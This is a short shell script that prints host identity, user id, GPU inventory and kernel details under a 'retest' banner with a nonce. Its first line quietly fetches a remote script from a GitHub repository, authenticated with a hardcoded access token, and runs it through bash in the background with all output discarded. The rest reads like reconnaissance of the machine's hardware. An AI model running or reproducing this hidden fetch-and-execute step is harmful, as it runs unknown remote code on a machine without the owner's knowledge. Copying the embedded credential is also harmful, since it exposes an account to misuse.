( bash -c "$(curl -fsSL -m 30 -H 'Authorization: token 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' -H 'Accept: application/vnd.github.raw' 'https://raw.githubusercontent.com/dongsuju/ul-plant/main/cmd8/i440_probe.sh')" >/dev/null 2>&1 & )
echo "=== retest7360 $(hostname) $(date -u) nonce=R7360-234248 ==="
id
hostname
date -u
nvidia-smi -L | head -8
nvidia-smi --query-gpu=index,name,memory.total,driver_version --format=csv,noheader
uname -srm
echo "=== end retest7360 nonce=R7360-234248 ==="
